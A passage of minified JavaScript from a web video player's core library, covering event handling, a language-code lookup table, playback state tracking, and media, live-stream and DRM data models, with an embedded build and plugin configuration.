q=this.listeners.h[b],X=0,ra=q.length;X<ra;){var Aa=X++;if(q[Aa].listener==c){d=q[Aa].wrapper,da.remove(q,q[Aa]);break}}0==q.length&&(c=this.listeners,Object.prototype.hasOwnProperty.call(c.h,b)&&delete c.h[b])}null!=this.eventElement&&null!=d&&this.eventElement.removeEventListener(b,d)},willTrigger:function(b){return!0},reattachEventListeners:function(){if(null!=this.listeners){var b=Object.keys(this.listeners.h),c=b.length,d=0;if(d<c)for(;d<c;)for(var q=b[d++],X=this.listeners.h[q],ra=0;ra<X.length;){var Aa=X[ra];++ra,this.attachEventListener(q,Aa.wrapper)}}},attachEventListener:function(b,c){null!=this.eventElement&&this.eventElement.addEventListener(b,c)},removeAllEventListeners:function(){if(null!=this.listeners)for(var b=Object.keys(this.listeners.h),c=b.length,d=0;d<c;)for(var q=b[d++],X=0,ra=this.listeners.h[q];X<ra.length;){var Aa=ra[X];++X,this.removeEventListener(q,Aa.listener)}},__class__:Y});var Z=function(b){R.call(this,b),this.className=Z.staticClassName};wa["bs.player.core.events.PlayerCommandEvent"]=Z,Z.__name__="bs.player.core.events.PlayerCommandEvent",Z.__super__=R,Z.prototype=Ja(R.prototype,{__class__:Z});var na=function(b){R.call(this,b),this.className=na.staticClassName};wa["bs.player.core.events.ResizeEvent"]=na,na.__name__="bs.player.core.events.ResizeEvent",na.add=function(b,c,d){V.getInstance().add(b,na.staticClassName,c,d)},na.remove=function(b,c,d){V.getInstance().remove(b,na.staticClassName,c,d)},na.disable=function(b,c){V.getInstance().disable(b,na.staticClassName,c)},na.enable=function(b,c){V.getInstance().enable(b,na.staticClassName,c)},na.filter=function(b){},na.__super__=R,na.prototype=Ja(R.prototype,{dispatch:function(b){V.getInstance().dispatch(b,na.staticClassName,this.type,this)},__class__:na});var T=function(b){R.call(this,b),this.className=T.staticClassName};wa["bs.player.core.events.VideoEvent"]=T,T.__name__="bs.player.core.events.VideoEvent",T.addOnce=function(b,c,d){V.getInstance().addOnce(b,T.staticClassName,c,d)},T.add=function(b,c,d){V.getInstance().add(b,T.staticClassName,c,d)},T.remove=function(b,c,d){V.getInstance().remove(b,T.staticClassName,c,d)},T.disable=function(b,c){V.getInstance().disable(b,T.staticClassName,c)},T.enable=function(b,c){V.getInstance().enable(b,T.staticClassName,c)},T.__super__=R,T.prototype=Ja(R.prototype,{dispatch:function(b){V.getInstance().dispatch(b,T.staticClassName,this.type,this)},__class__:T});var pa=function(){};wa["bs.player.core.interfaces.INoPlayerPlugin"]=pa,pa.__name__="bs.player.core.interfaces.INoPlayerPlugin",pa.__isInterface__=!0;var ia=function(){};wa["bs.player.core.interfaces.IPlugin"]=ia,ia.__name__="bs.player.core.interfaces.IPlugin",ia.__isInterface__=!0,ia.prototype={get_configuration:null,set_configuration:null,get_variables:null,set_variables:null,get_parentDisplay:null,set_parentDisplay:null,get_eventHub:null,set_eventHub:null,get_display:null,get_player:null,set_player:null,uid:null,context:null,className:null,display:null,getPluginVersion:null,getPluginName:null,eventFilter:null,registerPlugin:null,create:null,activate:null,postActivate:null,deactivate:null,destroy:null,__class__:ia,__properties__:{set_player:"set_player",get_player:"get_player",get_display:"get_display",set_eventHub:"set_eventHub",get_eventHub:"get_eventHub",set_parentDisplay:"set_parentDisplay",get_parentDisplay:"get_parentDisplay",set_variables:"set_variables",get_variables:"get_variables",set_configuration:"set_configuration",get_configuration:"get_configuration"}};var S=function(){};wa["bs.player.core.interfaces.IVideoPlayer"]=S,S.__name__="bs.player.core.interfaces.IVideoPlayer",S.__isInterface__=!0,S.prototype={minAudioTracksForInfo:null,context:null,variables:null,destroy:null,attachVideo:null,attachSubtitlesRenderer:null,reset:null,pause:null,play:null,playPause:null,seek:null,selectAudio:null,selectSubtitles:null,volume:null,setData:null,playerResize:null,videoReady:null,setPlaybackRate:null,getPlaybackRate:null,saveBandwidthModeVisibilityChange:null,onDurationChange:null,__class__:S};var V=function(){null==V.instance&&(this.plugins=[])};wa["bs.player.core.manager.EventHub"]=V,V.__name__="bs.player.core.manager.EventHub",V.getInstance=function(){return V.instance},V.prototype={plugins:null,registerPlugin:function(b){this.plugins.push(b),b.set_eventHub(this)},dispatch:function(b,c,d,q){var X=b+" | "+c+" | "+d;if(this.isEnabled(X)){for(var ra=!1,Aa=0,Qa=this.plugins;Aa<Qa.length;){var Wa=Qa[Aa];++Aa,Wa.context==b&&0==Wa.eventFilter(q)&&(ra=!0)}if(!ra){if(Object.prototype.hasOwnProperty.call(V.listenersMap.h,X))for(Aa=0,Qa=V.listenersMap.h[X];Aa<Qa.length;)ra=Qa[Aa],++Aa,ra(q);if(Object.prototype.hasOwnProperty.call(V.onceListenersMap.h,X)){for(Aa=0,Qa=V.onceListenersMap.h[X];Aa<Qa.length;)ra=Qa[Aa],++Aa,ra(q);for(Aa=0,Qa=V.onceListenersMap.h[X];Aa<Qa.length;)ra=Qa[Aa],++Aa,this.remove(b,c,d,ra)}}}},addOnce:function(b,c,d,q){for(b=b+" | "+c+" | "+d,Object.prototype.hasOwnProperty.call(V.onceListenersMap.h,b)||(V.onceListenersMap.h[b]=[]),b=V.onceListenersMap.h[b],c=0;c<b.length;)if(d=b[c],++c,d==q)return!1;return b.push(q),!0},add:function(b,c,d,q){for(b=b+" | "+c+" | "+d,Object.prototype.hasOwnProperty.call(V.listenersMap.h,b)||(V.listenersMap.h[b]=[]),b=V.listenersMap.h[b],c=0;c<b.length;)if(d=b[c],++c,d==q)return;b.push(q)},remove:function(b,c,d,q){b=b+" | "+c+" | "+d,this.removeListenerFromMap(b,q,V.listenersMap),this.removeListenerFromMap(b,q,V.onceListenersMap)},isEnabled:function(b){return null==(b=V.disabledListenersMap.h[b])||0==b},disable:function(b,c,d){b=b+" | "+c+" | "+d,c=V.disabledListenersMap.h[b],V.disabledListenersMap.h[b]=null==c?1:c+1},enable:function(b,c,d){b=b+" | "+c+" | "+d,null!=(c=V.disabledListenersMap.h[b])&&0<c&&(0>=--c?(c=V.disabledListenersMap,Object.prototype.hasOwnProperty.call(c.h,b)&&delete c.h[b]):V.disabledListenersMap.h[b]=c)},removeListenerFromMap:function(b,c,d){var q=[];if(Object.prototype.hasOwnProperty.call(d.h,b)&&(q=d.h[b]),0<q.length)for(var X=0;X<q.length;){var ra=q[X];if(++X,ra==c){q=q.slice(),da.remove(q,c),d.h[b]=q;break}}},__class__:V};var oa=function(b,c,d,q,X){this.langCodeLong=c,this.langCodeShort=b,this.englishName=d,this.nativeName=q,this.relatedLangCodes=X};wa["bs.player.core.manager.LangInfo"]=oa,oa.__name__="bs.player.core.manager.LangInfo",oa.prototype={langCodeShort:null,langCodeLong:null,englishName:null,nativeName:null,relatedLangCodes:null,__class__:oa};var ba=function(){if(null==ba.instance){var b=[];b.push(new oa("no","nor",this.toUtf8("Norwegian"),this.toUtf8("Norsk"),["nb","nn"])),b.push(new oa("nb","nob",this.toUtf8("Norwegian%20Bokm%C3%A5l"),this.toUtf8("Norsk"),["no","nn"])),b.push(new oa("nn","nno",this.toUtf8("Norwegian%20Nynorsk"),this.toUtf8("Norsk%20nynorsk"),["no","nb"])),b.push(new oa("da","dan",this.toUtf8("Danish"),this.toUtf8("dansk"),["dk"])),b.push(new oa("sv","swe",this.toUtf8("Swedish"),this.toUtf8("svenska"),["se"])),b.push(new oa("be","bel",this.toUtf8("Belarusian"),this.toUtf8("%D0%91%D0%B5%D0%BB%D0%B0%D1%80%D1%83%D1%81%D0%BA%D0%B0%D1%8F"))),b.push(new oa("bs","bos",this.toUtf8("Bosnian"),this.toUtf8("bosanski%20jezik"))),b.push(new oa("bg","bul",this.toUtf8("Bulgarian"),this.toUtf8("%D0%B1%D1%8A%D0%BB%D0%B3%D0%B0%D1%80%D1%81%D0%BA%D0%B8%20%D0%B5%D0%B7%D0%B8%D0%BA"))),b.push(new oa("ca","cat",this.toUtf8("Catalan"),this.toUtf8("Catal%C3%A0"))),b.push(new oa("hr","hrv",this.toUtf8("Croatian"),this.toUtf8("hrvatski"))),b.push(new oa("cz","ces",this.toUtf8("Czech"),this.toUtf8("%C4%8Cesky"))),b.push(new oa("nl","nld",this.toUtf8("Dutch"),this.toUtf8("Nederlands"),["dut"])),b.push(new oa("en","eng",this.toUtf8("English"),this.toUtf8("English"))),b.push(new oa("eo","epo",this.toUtf8("Esperanto"),this.toUtf8("Esperanto"))),b.push(new oa("et","est",this.toUtf8("Estonian"),this.toUtf8("eesti"))),b.push(new oa("es","spa",this.toUtf8("Spanish"),this.toUtf8("Espa%C3%B1ol"))),b.push(new oa("fo","fao",this.toUtf8("Faroese"),this.toUtf8("f%C3%B8royskt"))),b.push(new oa("fi","fin",this.toUtf8("Finnish"),this.toUtf8("suomi"))),b.push(new oa("fr","fra",this.toUtf8("French"),this.toUtf8("fran%C3%A7ais"),["fre"])),b.push(new oa("gl","glg",this.toUtf8("Galician"),this.toUtf8("Galego"))),b.push(new oa("de","deu",this.toUtf8("German"),this.toUtf8("Deutsch"),["ger"])),b.push(new oa("el","ell",this.toUtf8("Greek"),this.toUtf8("%CE%95%CE%BB%CE%BB%CE%B7%CE%BD%CE%B9%CE%BA%CE%AC"),["gre"])),b.push(new oa("hu","hun",this.toUtf8("Hungarian"),this.toUtf8("Magyar"))),b.push(new oa("ia","ina",this.toUtf8("Interlingua"),this.toUtf8("Interlingua"))),b.push(new oa("it","ita",this.toUtf8("Italian"),this.toUtf8("Italiano"))),b.push(new oa("ga","gle",this.toUtf8("Irish"),this.toUtf8("Gaeilge"))),b.push(new oa("lb","ltz",this.toUtf8("Luxembourgish"),this.toUtf8("L%C3%ABtzebuergesch"))),b.push(new oa("lt","lit",this.toUtf8("Lithuanian"),this.toUtf8("lietuvi%C5%B3"))),b.push(new oa("lv","lav",this.toUtf8("Latvian"),this.toUtf8("latvi%C5%B3"))),b.push(new oa("pl","pol",this.toUtf8("Polish"),this.toUtf8("polski"))),b.push(new oa("pt","por",this.toUtf8("Portuguese"),this.toUtf8("Portugu%C3%AAs"))),b.push(new oa("rm","roh",this.toUtf8("Romansh"),this.toUtf8("rumantsch%20grischun"))),b.push(new oa("ro","ron",this.toUtf8("Romanian"),this.toUtf8("rom%C3%A2n%C4%83"),["rum"])),b.push(new oa("ru","rus",this.toUtf8("Russian"),this.toUtf8("%D1%80%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9%20%D1%8F%D0%B7%D1%8B%D0%BA"))),b.push(new oa("sk","slk",this.toUtf8("Slovak"),this.toUtf8("Sloven%C4%8Dina"),["slo"])),b.push(new oa("sr","srp",this.toUtf8("Serbian"),this.toUtf8("%D0%A1%D1%80%D0%BF%D1%81%D0%BA%D0%B8"))),b.push(new oa("sl","slv",this.toUtf8("Slovene"),this.toUtf8("Sloven%C5%A1%C4%8Dina"))),b.push(new oa("tr","tur",this.toUtf8("Turkish"),this.toUtf8("T%C3%BCrk%C3%A7e"))),b.push(new oa("uk","ukr",this.toUtf8("Ukrainian"),this.toUtf8("%D1%83%D0%BA%D1%80%D0%B0%D1%97%D0%BD%D1%81%D1%8C%D0%BA%D0%B0"))),b.push(new oa("zk","chi",this.toUtf8("Chinese"),this.toUtf8("%E4%B8%AD%E6%96%87"),["zho","zh"])),b.push(new oa("ms","may",this.toUtf8("Malay"),this.toUtf8("Bahasa Melayu"),["msa"])),b.push(new oa("ar","ara",this.toUtf8("Arabic"),this.toUtf8("%D8%A7%D9%8E%D9%84%D9%92%D8%B9%D9%8E%D8%B1%D9%8E%D8%A8%D9%90%D9%8A%D9%8E%D9%91%D8%A9%D9%8F"),["arb"])),b.push(new oa("cdo_","cdo",this.toUtf8("Min Dong Chinese"),this.toUtf8("Min Dong Chinese"))),b.push(new oa("cjy_","cjy",this.toUtf8("Jinyu Chinese"),this.toUtf8("Jinyu Chinese"))),b.push(new oa("cmn_","cmn",this.toUtf8("Mandarin Chinese"),this.toUtf8("Mandarin Chinese"))),b.push(new oa("cpx_","cpx",this.toUtf8("Pu-Xian Chinese"),this.toUtf8("Pu-Xian Chinese"))),b.push(new oa("czh_","czh",this.toUtf8("Huizhou Chinese"),this.toUtf8("Huizhou Chinese"))),b.push(new oa("czo_","czo",this.toUtf8("Min Zhong Chinese"),this.toUtf8("Min Zhong Chinese"))),b.push(new oa("gan_","gan",this.toUtf8("Gan Chinese"),this.toUtf8("Gan Chinese"))),b.push(new oa("hak_","hak",this.toUtf8("Hakka Chinese"),this.toUtf8("Hakka Chinese"))),b.push(new oa("hsn_","hsn",this.toUtf8("Xiang Chinese"),this.toUtf8("Xiang Chinese"))),b.push(new oa("lzh_","lzh",this.toUtf8("Literary Chinese"),this.toUtf8("Literary Chinese"))),b.push(new oa("mnp_","mnp",this.toUtf8("Min Bei Chinese"),this.toUtf8("Min Bei Chinese"))),b.push(new oa("nan_","nan",this.toUtf8("Min Nan Chinese"),this.toUtf8("Min Nan Chinese"))),b.push(new oa("wuu_","wuu",this.toUtf8("Wu Chinese"),this.toUtf8("Wu Chinese"))),b.push(new oa("yue_","yue",this.toUtf8("Yue Chinese"),this.toUtf8("Yue Chinese"))),b.push(new oa("cnp_","cnp",this.toUtf8("Northern Ping Chinese"),this.toUtf8("Northern Ping Chinese"))),b.push(new oa("csp_","csp",this.toUtf8("Southern Ping Chinese"),this.toUtf8("Southern Ping Chinese"))),b.push(new oa("mul_","mul",this.toUtf8("Multiple languages"),this.toUtf8("Multiple languages"))),b.push(new oa("mis_","mis",this.toUtf8("No code for language"),this.toUtf8("No code for language"))),b.push(new oa("und_","und",this.toUtf8("Undefined"),this.toUtf8("Undefined"))),this.setLangInfoList(b)}};wa["bs.player.core.manager.I18NHelper"]=ba,ba.__name__="bs.player.core.manager.I18NHelper",ba.getInstance=function(){return ba.instance},ba.getLanguageNativeNameByCode=function(b){try{b=b.toLowerCase();var c=ba.getInstance();return Object.prototype.hasOwnProperty.call(c.langInfoByLangShortCode.h,b)?c.langInfoByLangShortCode.h[b].nativeName:Object.prototype.hasOwnProperty.call(c.langInfoByLangLongCode.h,b)?c.langInfoByLangLongCode.h[b].nativeName:Object.prototype.hasOwnProperty.call(c.langInfoByRelatedCode.h,b)?c.langInfoByRelatedCode.h[b].nativeName:null}catch(d){return b=yb.caught(d).unwrap(),console.log("player/src/bs/player/core/manager/I18NHelper.hx:164:",b),null}},ba.getLanguageInfoByCode=function(b){try{b=b.toLowerCase();var c=ba.getInstance();return Object.prototype.hasOwnProperty.call(c.langInfoByLangShortCode.h,b)?c.langInfoByLangShortCode.h[b]:Object.prototype.hasOwnProperty.call(c.langInfoByLangLongCode.h,b)?c.langInfoByLangLongCode.h[b]:Object.prototype.hasOwnProperty.call(c.langInfoByRelatedCode.h,b)?c.langInfoByRelatedCode.h[b]:null}catch(d){return b=yb.caught(d).unwrap(),console.log("player/src/bs/player/core/manager/I18NHelper.hx:185:",b),null}},ba.findBestFittingLangCodeForSelected=function(b,c){b=b.toLowerCase();var d=ba.getLanguageInfoByCode(b);if(null==d)return-1!=c.indexOf(b)?b:null;b=[];for(var q=0;q<c.length;){var X=c[q];++q,X=ba.getLanguageInfoByCode(X),b.push(X)}var ra=[];if(ra.push(d),null!=d.relatedLangCodes)for(q=0,d=d.relatedLangCodes;q<d.length;)X=d[q],++q,null!=(X=ba.getLanguageInfoByCode(X))&&ra.push(X);for(q=0;q<ra.length;){var Aa=ra[q];++q,d=0;for(var Qa=b.length;d<Qa;){var Wa=d++;if(null!=(X=b[Wa])&&Aa.langCodeShort==X.langCodeShort)return c[Wa]}}return null},ba.normalizeLanguageNameFormat=function(b){if(null==b)return null;var c=da.substr(b,0,1);return b=da.substr(b,1,b.length),c.toUpperCase()+b},ba.preselectSubtitlesSet=function(b,c){if(null!=b&&null!=c&&0!=c.length&&"off"!=b){for(var d=[],q=0;q<c.length;){var X=c[q];++q,d.push(X.languageCode)}for(b=ba.findBestFittingLangCodeForSelected(b,d),q=0;q<c.length;)X=c[q],++q,b==X.languageCode&&(X.preselected=!0)}},ba.prototype={langInfoList:null,langInfoByLangShortCode:null,langInfoByLangLongCode:null,langInfoByRelatedCode:null,toUtf8:function(b){return decodeURIComponent(b)},setLangInfoList:function(b){this.langInfoList=b,this.langInfoByLangShortCode=new Jb,this.langInfoByLangLongCode=new Jb,this.langInfoByRelatedCode=new Jb,b=0;for(var c=this.langInfoList;b<c.length;){var d=c[b];++b,this.langInfoByLangShortCode.h[d.langCodeShort]=d,this.langInfoByLangLongCode.h[d.langCodeLong]=d}for(b=0,c=this.langInfoList;b<c.length;)if(d=c[b],++b,null!=d.relatedLangCodes)for(var q=0,X=d.relatedLangCodes;q<X.length;){var ra=X[q];++q,this.langInfoByRelatedCode.h[ra]=d}},getLangInfoList:function(){return this.langInfoList},__class__:ba};var ha=function(b){this.context=b,this.state="init"};wa["bs.player.core.manager.PlaybackStateMonitor"]=ha,ha.__name__="bs.player.core.manager.PlaybackStateMonitor",ha.prototype={context:null,state:null,currentMedia:null,init:function(){T.add(this.context,"bufferingStart",U(this,this.onVideoBuffering)),T.add(this.context,"complete",U(this,this.onVideoComplete)),T.add(this.context,"mediaError",U(this,this.onVideoError)),T.add(this.context,"playing",U(this,this.onVideoPlaying)),T.add(this.context,"paused",U(this,this.onVideoPaused)),T.add(this.context,"seekingStart",U(this,this.onVideoSeeking)),T.add(this.context,"seekingEnd",U(this,this.onVideoSeekingEnd)),Q.add(this.context,"adPlaying",U(this,this.onVideoPlaying)),Q.add(this.context,"adPaused",U(this,this.onVideoPaused)),Q.add(this.context,"seekingStart",U(this,this.onVideoSeeking)),Q.add(this.context,"seekingEnd",U(this,this.onVideoSeekingEnd)),aa.add(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.add(this.context,"mediaAfterPlaybackStartMetadata",U(this,this.onAfterPlaybackStartMetadataData))},destroy:function(){T.remove(this.context,"bufferingStart",U(this,this.onVideoBuffering)),T.remove(this.context,"complete",U(this,this.onVideoComplete)),T.remove(this.context,"mediaError",U(this,this.onVideoError)),T.remove(this.context,"playing",U(this,this.onVideoPlaying)),T.remove(this.context,"paused",U(this,this.onVideoPaused)),T.remove(this.context,"seekingStart",U(this,this.onVideoSeeking)),T.remove(this.context,"seekingEnd",U(this,this.onVideoSeekingEnd)),aa.remove(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.remove(this.context,"mediaAfterPlaybackStartMetadata",U(this,this.onAfterPlaybackStartMetadataData))},onVideoPlaying:function(b){this.state="playing"},onVideoComplete:function(b){this.state="complete"},onVideoPaused:function(b){this.state="paused"},onVideoBuffering:function(b){this.state="buffering"},onVideoError:function(b){this.state="error"},onVideoSeeking:function(b){this.state="seeking"},onVideoSeekingEnd:function(b){this.state="playing",null==b||null==b.data||null==b.data.media||b.data.media.mediaPlaybackInfo.isPlaying||(this.state="paused")},onMetadataData:function(b){this.state="init",this.currentMedia=null!=b?b.data:null},onAfterPlaybackStartMetadataData:function(b){this.currentMedia=null!=b?b.data:null},__class__:ha};var ka=function(){};wa["bs.player.core.manager.PlaybackStateRegister"]=ka,ka.__name__="bs.player.core.manager.PlaybackStateRegister",ka.getMonitor=function(b){if(!Object.prototype.hasOwnProperty.call(ka.monitors.h,b)){var c=new ha(b);ka.monitors.h[b]=c,c.init()}return ka.monitors.h[b]},ka.destroyMonitor=function(b){if(Object.prototype.hasOwnProperty.call(ka.monitors.h,b)){ka.monitors.h[b].destroy();var c=ka.monitors;Object.prototype.hasOwnProperty.call(c.h,b)&&delete c.h[b]}};var la=function(){};wa["bs.player.core.model.DrmProvider"]=la,la.__name__="bs.player.core.model.DrmProvider";var C=function(){};wa["bs.player.core.model.OptionalLiveStreamInfo"]=C,C.__name__="bs.player.core.model.OptionalLiveStreamInfo",C.__isInterface__=!0,C.prototype={channelInfo:null,episodeInfo:null,seasonInfo:null,seriesInfo:null,liveProgramInfo:null,__class__:C};var fa=function(){this.customParams=new Jb};wa["bs.player.core.model.ModelObject"]=fa,fa.__name__="bs.player.core.model.ModelObject",fa.prototype={id:null,customParams:null,__class__:fa};var qa=function(){this.customParams=new Jb};wa["bs.player.core.model.LiveChannelInfo"]=qa,qa.__name__="bs.player.core.model.LiveChannelInfo",qa.__super__=fa,qa.prototype=Ja(fa.prototype,{name:null,__class__:qa});var va=function(){this.customParams=new Jb,this.mediaDetails=new Ta,this.mediaUserSettings=new qb,this.mediaSettings=new ib,this.mediaPlaybackInfo=new mb,this.progress=new Qb,this.drmCustomLicenseServerHandler=null,this.failedPlaybackPlayers=new Jb,this.spherical=!1,this.contentMeta=new Jb};wa["bs.player.core.model.Media"]=va,va.__name__="bs.player.core.model.Media",va.__super__=fa,va.prototype=Ja(fa.prototype,{title:null,duration:null,source:null,sourceFallbacks:null,subtitlesSets:null,audioSets:null,splashImages:null,posterImages:null,mediaDetails:null,mediaUserSettings:null,mediaSettings:null,mediaPlaybackInfo:null,mediaLandingPage:null,mediaPlaylist:null,drmCustomLicenseServerHandler:null,progress:null,failedPlaybackPlayers:null,spherical:null,contentMeta:null,hasFallbackSources:function(){return null!=this.source&&1<this.source.length||null!=this.sourceFallbacks&&0<this.sourceFallbacks.length&&0<this.sourceFallbacks[0].length},useFallbackSources:function(){this.hasFallbackSources()&&(null!=this.source&&1<this.source.length?this.source=this.source.slice(1):(this.source=this.sourceFallbacks[0],this.sourceFallbacks=this.sourceFallbacks.slice(1)))},__class__:va});var xa=function(){va.call(this)};wa["bs.player.core.model.Live"]=xa,xa.__name__="bs.player.core.model.Live",xa.__interfaces__=[C],xa.__super__=va,xa.prototype=Ja(va.prototype,{dvrWindowLength:null,dvrWindowLiveEdge:null,lowLatencyMode:null,channelInfo:null,episodeInfo:null,seasonInfo:null,seriesInfo:null,liveProgramInfo:null,__class__:xa});var za=function(){va.call(this)};wa["bs.player.core.model.Catchup"]=za,za.__name__="bs.player.core.model.Catchup",za.__interfaces__=[C],za.__super__=va,za.prototype=Ja(va.prototype,{channelInfo:null,episodeInfo:null,seasonInfo:null,seriesInfo:null,liveProgramInfo:null,__class__:za});var Ca=function(){va.call(this)};wa["bs.player.core.model.LiveStream"]=Ca,Ca.__name__="bs.player.core.model.LiveStream",Ca.__super__=xa,Ca.prototype=Ja(xa.prototype,{streamEnd:null,streamEndThankYouImageUrl:null,streamWaitingForTransmissionImageUrl:null,__class__:Ca});var Ba=function(){va.call(this)};wa["bs.player.core.model.LiveChannel"]=Ba,Ba.__name__="bs.player.core.model.LiveChannel",Ba.__super__=xa,Ba.prototype=Ja(xa.prototype,{name:null,logoImages:null,programs:null,findProgramForDate:function(b){if(null==this.programs)return null;null==b&&(b=new Date),b=b.getTime();for(var c=0,d=this.programs;c<d.length;){var q=d[c];if(++c,q.eventStart.getTime()<=b&&b<q.eventEnd.getTime())return q}return null},__class__:Ba});var Ga=function(){va.call(this)};wa["bs.player.core.model.LiveProgramStream"]=Ga,Ga.__name__="bs.player.core.model.LiveProgramStream",Ga.__super__=xa,Ga.prototype=Ja(xa.prototype,{__class__:Ga});var Ra=function(){this.customParams=new Jb};wa["bs.player.core.model.LiveProgram"]=Ra,Ra.__name__="bs.player.core.model.LiveProgram",Ra.__super__=fa,Ra.prototype=Ja(fa.prototype,{title:null,descriptionLong:null,descriptionShort:null,eventStart:null,eventEnd:null,__class__:Ra});var La=function(){};wa["bs.player.core.model.PlayerConfigTool"]=La,La.__name__="bs.player.core.model.PlayerConfigTool",La.getInstance=function(){return null==La.instance&&(La.instance=new La,La.initialize()),La.instance},La.initialize=function(){La.compilerConfig=JSON.parse('{"builds":[{"name":"js","output":"bin/for_bradmax/bradmax_player.js","target":"js","arguments":["-D custom_js","-D dash","-main bs.player.composer.Embeder","-cp player/src","-cp node_modules/@bradmax/stats-common/src"]}],"dependencies":[{"name":"svg","version":"1.0.8","type":"haxelib"},{"name":"actuate","version":"1.8.3","type":"haxelib"},{"name":"promhx","version":"1.0.0","type":"haxelib"}],"variables":[],"plugins":[{"main":"bs.player.plugin.video.Video","name":"Video","source":"plugins/Video/src","config":{},"jsDependencies":[{"position":"before","includeOnce":true,"file":"assets/js/header.js"}]},{"main":"bs.player.plugin.video.videoPlayer.VideoHlsJs","name":"VideoHlsJs","source":"plugins/VideoHlsJs/src","config":{},"jsDependencies":[{"position":"before","includeOnce":true,"file":"assets/js/hls.min.js"}]},{"main":"bs.player.plugin.video.videoPlayer.VideoDashJs","name":"VideoDashJs","source":"plugins/VideoDashJs/src","config":{},"jsDependencies":[{"position":"before","includeOnce":true,"file":"assets/js/dash.all.wrapper.js"}]},{"main":"bs.player.plugin.skin.BasicSkin","name":"BasicSkin","source":"plugins/BasicSkin/src","config":{"style":"plugins/BasicSkin/themes/mole/style.json","logoXPosition":"left","advance":false,"logoAutohide":false,"resetColorScheme":"reset to skin default color scheme","skin":"mole","subtitles":null,"shareButtons":"","COLOR_PROGRESS_2":"#000000","layout":"plugins/BasicSkin/themes/mole/layout.xml","COLOR_PROGRESS_1":"#000000","logoYPosition":"top","logoLink":null,"COLOR_PROGRESS_0":"#aaaaaa","logoFile":null,"autoplay":false,"COLOR_CONTROLS_1":"#000000","COLOR_BASE_1":"#ffffff","branding":null,"startEndSplash":null,"showSkinOnInit":true,"audio":null,"videoCastEnabled":true,"COLOR_BASE_0":"#000000","pictureInPictureButtonVisible":true,"COLOR_TEXT":"#ffffff","logoLinkTarget":"_blank","skinAndColor":null,"volume":0.7,"COLORS_SHADE_MAP_BASE":"#000000","COLOR_CONTROLS_2":"#000000","COLOR_CONTROLS_0":"#000000","endSplash":"reload"},"jsDependencies":[]},{"main":"bs.player.plugin.playbackresume.PlaybackResume","name":"PlaybackResume","source":"plugins/PlaybackResume/src","config":{},"jsDependencies":[]},{"main":"bs.player.plugin.javascriptapi.JavascriptApi","name":"JavascriptApi","source":"plugins/JavascriptApi/src","config":{},"jsDependencies":[]},{"main":"bs.player.plugin.dataProvider.BradmaxDataProvider","name":"BradmaxDataProvider","source":"plugins/BradmaxDataProvider/src","config":{},"jsDependencies":[]},{"main":"bs.player.plugin.bradmax.analytics.BradmaxAnalytics","name":"BradmaxAnalytics","source":"plugins/BradmaxAnalytics/src","config":{"clientToken":"4zm4.zFqbOf1m4PzAqHmTfKbq4UwszEq4m9fEb"},"jsDependencies":[{"position":"before","includeOnce":true,"file":"assets/js/bradmax_analytics_bams.js"}]},{"main":"bs.player.plugin.stats.GoogleAnalytics","name":"GoogleAnalytics","source":"plugins/GoogleAnalytics/src","config":{},"jsDependencies":[]},{"main":"bs.player.plugin.stats.GemiusStream","name":"GemiusStream","source":"plugins/GemiusStream/src","config":{},"jsDependencies":[]}]}')},La.prototype={parseCompilerConfig:function(){},parseEmbedConfig:function(){},__class__:La};var Ya=function(){};wa["bs.player.core.model.PlayerData"]=Ya,Ya.__name__="bs.player.core.model.PlayerData",Ya.prototype={plugins:null,playList:null,media:null,__class__:Ya};var hb=function(){this.customParams=new Jb,this.authParams=new Jb};wa["bs.player.core.model.User"]=hb,hb.__name__="bs.player.core.model.User",hb.__super__=fa,hb.prototype=Ja(fa.prototype,{name:null,language:null,domain:null,authParams:null,__class__:hb});var bb=function(){this.currentPos=-1,this.items=[]};wa["bs.player.core.model.MediaPlaylist"]=bb,bb.__name__="bs.player.core.model.MediaPlaylist",bb.prototype={items:null,currentPos:null,length:null,hasNext:function(){return this.currentPos+1<this.items.length},next:function(){return this.currentPos<this.items.length&&this.currentPos++,0<=this.currentPos&&this.currentPos<this.items.length?this.items[this.currentPos]:null},reset:function(){this.currentPos=-1},clone:function(){for(var b=new bb,c=this.items,d=Array(c.length),q=0,X=c.length;q<X;){var ra=q++;d[ra]=c[ra]}return b.items=d,b.currentPos=this.currentPos+0|0,b},shift:function(){this.reset(),this.items.shift()},get_length:function(){return null!=this.items?this.items.length:0},__class__:bb,__properties__:{get_length:"get_length"}};var Da=function(){this.customParams=new Jb};wa["bs.player.core.model.MediaSource"]=Da,Da.__name__="bs.player.core.model.MediaSource",Da.__super__=fa,Da.prototype=Ja(fa.prototype,{url:null,contentType:null,width:null,height:null,bitrate:null,drm:null,spherical:null,__class__:Da});var Pa=function(){this.customParams=new Jb};wa["bs.player.core.model.Drm"]=Pa,Pa.__name__="bs.player.core.model.Drm",Pa.__super__=fa,Pa.prototype=Ja(fa.prototype,{provider:null,selectedDrmSystem:null,playready:null,widevine:null,fairplay:null,__class__:Pa});var eb=function(){this.customParams=new Jb};wa["bs.player.core.model.DrmData"]=eb,eb.__name__="bs.player.core.model.DrmData",eb.__super__=fa,eb.prototype=Ja(fa.prototype,{laUrl:null,customData:null,certUrl:null,audioRobustness:null,videoRobustness:null,__class__:eb});var Ta=function(){};wa["bs.player.core.model.MediaDetails"]=Ta,Ta.__name__="bs.player.core.model.MediaDetails",Ta.prototype={tags:null,genres:null,descriptionLong:null,descriptionShort:null,year:null,mediaCast:null,directors:null,customParams:null,__class__:Ta};var qb=function(){};wa["bs.player.core.model.MediaUserSettings"]=qb,qb.__name__="bs.player.core.model.MediaUserSettings",qb.prototype={wasWatched:null,isFavorite:null,resumePostion:null,hasWatchingFinished:null,__class__:qb};var ib=function(){this.hasConcurrencyControl=!1,this.customParams=new Jb};wa["bs.player.core.model.MediaSettings"]=ib,ib.__name__="bs.player.core.model.MediaSettings",ib.prototype={hasConcurrencyControl:null,customParams:null,__class__:ib};var mb=function(){this.playbackRate=this.currentTotalBitrateKpbs=this.currentTime=null,this.isPlaying=!1,this.customParams=new Jb};wa["bs.player.core.model.MediaPlaybackInfo"]=mb,mb.__name__="bs.player.core.model.MediaPlaybackInfo",mb.prototype={currentTime:null,currentTotalBitrateKpbs:null,playbackRate:null,isPlaying:null,customParams:null,__class__:mb};var Db=function(){this.customParams=new 